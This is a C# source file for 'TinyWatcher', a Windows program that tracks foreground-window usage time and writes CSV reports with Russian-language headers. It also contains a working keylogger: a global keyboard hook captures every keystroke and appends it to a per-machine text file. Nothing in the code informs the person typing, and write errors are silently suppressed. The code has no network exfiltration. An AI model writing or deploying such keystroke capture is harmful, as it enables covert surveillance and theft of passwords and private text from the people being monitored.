using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using MouseKeyboardLibrary;
using System.Globalization;

namespace TinyWatcher
{
    public class Watcher
    {
        IntPtr hWnd = GetForegroundWindow();
        uint procId = 0;
        string MName = System.Environment.MachineName;
        static string datePatt = "d-M-yyyy_HH-mm-ss";
        static string csvPatt = "d-M-yyyy HH:mm:ss";
        string STime = DateTime.Now.ToString(datePatt);
        System.Threading.Timer tm;
        public bool Recording = false;
        public List<ProcList> procList = new List<ProcList>();
        int timerTick = Properties.Settings.Default.timerTick;
        int saveTime = Properties.Settings.Default.saveTime * 60;
        KeyboardHook keyboardHook = new KeyboardHook();
        public StringBuilder sbText = new StringBuilder();

        public Watcher()
        {
            keyboardHook.KeyDown += new KeyEventHandler(keyboardHook_KeyDown);
            keyboardHook.KeyPress += keyboardHook_KeyPress;
        }

        void keyboardHook_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!Char.IsControl(e.KeyChar))
                sbText.Append(e.KeyChar.ToString());
        }        

        void keyboardHook_KeyDown(object sender, KeyEventArgs e)
        {               
            switch (e.KeyCode)
            {                 
                case Keys.Enter:
                    sbText.AppendLine();
                    return;
                case Keys.Tab:
                    sbText.Append("[TAB]");
                    return;
                case Keys.Back:
                    sbText.Append("[BS]");
                    return;
                case Keys.Delete:
                    sbText.Append("[DEL]");
                    return;
                case Keys.Alt:
                    if (e.Shift) sbText.Append("["+CultureInfo.CurrentCulture+"]");
                    return;
                case Keys.LShiftKey:
                    if (e.Alt) sbText.Append("[" + CultureInfo.CurrentCulture + "]");
                    return;
            }               
        }

        public string GetName()
        {
            hWnd = GetForegroundWindow();
            GetWindowThreadProcessId(hWnd, out procId);
            Process proc = Process.GetProcessById((int)procId);
            return proc.MainModule.ModuleName.ToString() + " : " + proc.MainWindowTitle + " : " + hWnd.ToString();
        }
        public void StartRecord()
        {
            if (!Recording)
            {
                AutoResetEvent autoEvent = new AutoResetEvent(false);
                TimerCallback tcb = CheckWindow;
                tm = new System.Threading.Timer(tcb, autoEvent, 1000, timerTick);
                Recording = true;
                keyboardHook.Start();
                sbText = new StringBuilder();
            }
        }
        public void StopRecord()
        {
            if (Recording)
            {
                tm.Dispose();
                Recording = false;
                keyboardHook.Stop();
            }
        }
        int IterCheck = 0;
        public void CheckWindow(Object stateInfo)
        {
            hWnd = GetForegroundWindow();
            GetWindowThreadProcessId(hWnd, out procId);
            Process proc;
            bool Found = false;
            try
            {
                proc = Process.GetProcessById((int)procId);
                for (int i = 0; i < procList.Count; i++)
                {
                    if (procList[i].titleName == proc.MainWindowTitle.ToString())
                    {
                        Found = true;
                        procList[i].usage += timerTick / 1000;
                        break;
                    }
                }
                if (!Found)
                {
                    procList.Add(new ProcList(proc.MainWindowTitle.ToString(), proc.MainModule.ModuleName.ToString(), hWnd, timerTick / 1000, DateTime.Now.ToString(csvPatt)));
                }
            }
            catch
            {

            }
            finally
            {                
                IterCheck++;
                if (IterCheck * (timerTick / 1000) >= saveTime)
                {
                    WriteFile();
                    IterCheck = 0;
                }
            }
        }
        public void WriteFile()
        {           
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Информация по использованию приложений, время запуска: " + STime);
            sb.AppendLine();
            sb.AppendLine(String.Format("{0};{1};{2};{3};{4}", "Заголовок", "Название файла", "Время использования", "Время первого запуска", "Секунды(DEBUG)"));
            procList = procList.OrderBy(o=>o.procName).ToList<ProcList>();
            int totalUsage = 0;
            for (int i = 0; i < procList.Count; i++ )
            {
                totalUsage += procList[i].usage;
                string str_usage = getTimeStr(procList[i].usage);
                if (i > 0 && procList[i - 1].procName == procList[i].procName)
                {
                    sb.AppendLine(String.Format("__{0};{1};{2};{3};{4}", procList[i].titleName, procList[i].procName, str_usage, procList[i].sTime, procList[i].usage));
                    if (i == procList.Count - 1)
                    {
                        sb.AppendLine(buildMatch(i));
                    }
                }
                else if (i > 1 && procList[i - 1].procName == procList[i - 2].procName)
                {
                    sb.AppendLine(buildMatch(i));
                    sb.AppendLine(String.Format("{0};{1};{2};{3};{4}", procList[i].titleName, procList[i].procName, str_usage, procList[i].sTime, procList[i].usage));
                }
                else
                    sb.AppendLine(String.Format("{0};{1};{2};{3};{4}", procList[i].titleName, procList[i].procName, str_usage, procList[i].sTime, procList[i].usage));
            }

            string str_total_usage = getTimeStr(totalUsage);
            sb.AppendLine();
            sb.AppendLine("Всего с момента запуска прошло:;" + str_total_usage);
            string filePath = Properties.Settings.Default.savePath != "" ? Properties.Settings.Default.savePath : AppDomain.CurrentDomain.BaseDirectory;
            try
            {
                using (StreamWriter outfile = new StreamWriter(filePath + @"\" + MName + "_" + STime + ".csv", false, Encoding.GetEncoding("Windows-1251")))
                {
                    outfile.Write(sb.ToString());
                }
            }
            catch
            {

            }
            try
            {
                using (StreamWriter outfile = new StreamWriter(filePath + @"\" + MName + "_" + STime + ".txt", true, Encoding.GetEncoding(1252)))
                {
                    outfile.Write(sbText.ToString());
                    sbText = new StringBuilder();
                }
            }
            catch
            {

            }
        }
        string getTimeStr(int Time)
        {
            int hTime = Time;
            int h = 0, m = 0, s = 0;
            if (Time > 3600)
            {
                h = (int)((Time - Time % 3600) / 3600);
                Time = Time % 3600;
            }
            if (Time > 60)
            {
                m = (int)((Time - Time % 60) / 60);
                Time = Time % 60;
            }
            s = Time;
            return String.Format("{0:00}ч {1:00}м {2:00}с", h, m, s);
        }
        string buildMatch(int i)
        {
            int item_Usage = 0;
            string prev = "";
            for (int j = i - 1; j >= 0; j--)
            {
                if (procList[j].procName != prev && j != i - 1)
                {
                    break;
                }
                item_Usage += procList[j].usage;
                prev = procList[j].procName;
            }

            string p_usage = getTimeStr(item_Usage);
            return String.Format("__Приложение {0} всего было активным:;;; {1}", procList[i - 1].procName, p_usage);
        }

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    }
    public class ProcList
    {
        public string titleName, procName;
        public IntPtr procID;
        public int usage;
        public string sTime;
        public ProcList(string _title, string _name, IntPtr _procid, int _usage, string _sTime)
        {
            titleName = _title;
            procName = _name;
            procID = _procid;
            usage = _usage;
            sTime = _sTime;
        }
    }
}
